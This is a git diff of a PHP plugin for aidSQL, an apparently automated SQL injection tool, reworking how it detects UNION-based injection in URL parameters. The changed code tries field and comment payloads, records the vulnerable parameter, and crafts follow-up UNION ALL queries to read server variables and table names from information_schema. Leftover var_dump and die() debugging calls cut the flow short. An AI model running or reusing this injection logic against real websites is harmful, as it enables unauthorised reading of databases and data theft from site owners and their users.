@@ -4,55 +4,100 @@
 
 		class MySQL5 extends InjectionPlugin {
 
-			const		PLUGIN_NAME						= "MySQL5 Standard Plugin by Juan Stange";
+			const		PLUGIN_NAME						= "MySQL Standard Plugin by Juan Stange";
 
 			private	$_groupConcatLength			=	1024;			//Default group concat character length
-			private	$_affectedDatabases			=	array("mysql5");
+			private	$_affectedDatabases			=	array("mysql");
 			private	$_strRepeat						=	100;
 			private	$_repeatCharacter				=	"a";
+			private	$_fields							=	array();
+			private	$_vulnerableIndex				=	0;
+			private	$_fieldWrapping				=	NULL;
+			private	$_detected						=	NULL;
+			private	$_method							=	NULL;
 
 			public function injectionUnionWithConcat(){
 
-				$parser			=	new \aidSQL\parser\Generic();
-				
-				$parser->setOpenTag("NULL");
-				$parser->setCloseTag("NULL");
+				$parser						=	new \aidSQL\parser\Generic();
 
+				$parser->setOpenTag("NULL,");
+				$parser->setCloseTag(",NULL");
 				$this->setParser($parser);
 
 				$offset	=	(isset($this->_config["start-offset"])) ? (int)$this->_config["start-offset"] : 1;
 
 				if(!$offset){
+
 					throw(new \Exception("Start offset should be an integer greater than 0!"));
+
 				}
+
+				$detected	=	$this->detectUnionInjection(__FUNCTION__,"CONCAT(NULL,%value%,NULL)");
+				var_dump($this->_detected);
+				die();	
+				if($detected){
+
+					$this->log("FOUND UNION INJECTION WITH CONCAT",0,"light_green");
+					var_dump($this->getGroupConcatLength());
+					die();
+					return $this->getSchema();
+
+				}
+
+				return FALSE;
+
+			}
+
+
+			private function detectUnionInjection($method,$wrapping=NULL,$value=NULL){
 
 				$fieldPayloads		=	explode('_',$this->_config["field-payloads"]);
 				$commentPayloads	=	explode('_',$this->_config["comment-payloads"]);
 
-				$vars					=	$this->_httpAdapter->getUrl()->getQueryAsArray();
+				$requestVariables	=	$this->_httpAdapter->getUrl()->getQueryAsArray();
 
-				foreach($vars as $variable=>$value){
+				foreach($requestVariables as $requestVariable=>$value){
 
-					$this->_affectedUrlvariable	=	$variable;
+					$iterationContainer	=	array();
 
-					$iterationContainer				=	array();
-					$queryBuilder						=	new \aidSQL\core\QueryBuilder();
+					for($maxFields=1;$maxFields<=$this->_injectionAttempts;$maxFields++){
 
-					for($maxFields=$offset;$maxFields<=$this->_injectionAttempts;$maxFields++){
-
-						$iterationContainer[]	=	$maxFields;
-
-						$queryBuilder->union($queryBuilder->wrapArray($iterationContainer,"CONCAT(NULL,%value%,NULL)"),"ALL");
-						var_dump($queryBuilder->getSQL());	
-						die();
+						$iterationContainer[]	=	(!empty($value))	?	$value	:	$maxFields;
 
 						foreach($fieldPayloads as $payLoad){
 
 							foreach($commentPayloads as $comment){
 
-								if($isVulnerable	=	$this->query($queryBuilder,__FUNCTION__)){
-									var_dump($isVulnerable);
-									die();
+								$queryBuilder	=	new \aidSQL\core\QueryBuilder();
+
+								if(!empty($wrapping)){
+									$values	=	$queryBuilder->wrapArray($iterationContainer,$wrapping);
+								}else{
+									$values	=	$iterationContainer;
+								}
+
+								$queryBuilder->union($values,"ALL");
+								$queryBuilder->setCommentOpen($comment);
+
+								$sql	=	$value.$payLoad.$queryBuilder->getSpaceCharacter().$queryBuilder->getSQL().$comment;
+								$queryBuilder->setSQL($sql);
+
+								if($isVulnerable	=	$this->query($queryBuilder,$requestVariable,$method)){
+
+									$this->_detected	=	array(
+																		"index"				=>	$maxFields,	
+																		"fieldValues"		=>	$iterationContainer,
+																		"requestVariable"	=>	$requestVariable,
+																		"requestValue"		=>	$value,
+																		"fieldPayload"		=>	$payLoad,
+																		"comment"			=>	$comment,
+																		"wrapping"			=>	$wrapping,
+																		"data"				=>	$isVulnerable
+	
+									);
+
+									return TRUE;
+
 								}
 
 							}
@@ -62,14 +107,41 @@
 					}
 
 					$url	=	$this->_httpAdapter->getUrl();
-
-					//Restore value if we couldnt find the vulnerable field
 					$url->addRequestVariable($variable,$value); 
 					$this->_httpAdapter->setUrl($url);
 
 				}
 
 				return FALSE;
+
+			}
+
+			private function unionQuery($value){
+
+				return $this->query($this->craftUnionInjection($value),$this->_detected["requestVariable"],$this->_method);
+
+			}
+
+			private function craftUnionInjection($value){
+
+				$params			=	&$this->_detected;
+	
+				$queryBuilder	=	new \aidSQL\core\QueryBuilder();
+
+				foreach($params["fieldValues"] as &$val){
+					$val	=	$value;	
+				}
+
+				$params["fieldValues"]	=	$queryBuilder->wrapArray($params["fieldValues"],$params["wrapping"]);
+
+				$queryBuilder->union($params["fieldValues"],"ALL");
+
+				$sql	=	$queryBuilder->getSQL();
+				$sql	=	$params["requestValue"]." ".$params["fieldPayload"].$sql.$params["comment"];
+
+				$queryBuilder->setSQL($sql);
+
+				return $queryBuilder;
 
 			}
 
@@ -102,28 +174,13 @@
 			private function getGroupConcatLength(){
 
 				$this->log("Checking for @@group_concat_max_len",0,"light_cyan");
-
-				$select	=	"@@group_concat_max_len";
-
-				$length	=	(int)$this->execute($select);
-
-				if(!$length){
-
-					$length	=	1024;
-					$this->log("Warning, couldnt properly determine group concat length, setting length to $length",0,"yellow");
-
-				}else{
-
-					$this->log("@@group_concat_max_len = $length",0,"light_cyan");
-
-				}
-
-				$this->_groupConcatLength	=	$length;
+				return $this->unionQuery("@@group_concat_max_len");
 
 			}
 
 			public function getSchema($complete=TRUE){
 
+				$this->getGroupConcatLength();
 				$version	=	$this->getVersion();
 
 				if(!$this->checkVersion($version)){
@@ -133,6 +190,7 @@
 
 				//Determines server global variable @@group_concat_max_len
 				$this->getGroupConcatLength();
+				die();
 
 				$select									=	"GROUP_CONCAT(TABLE_NAME)";
 				$from										=	"FROM information_schema.tables WHERE table_schema=DATABASE()";
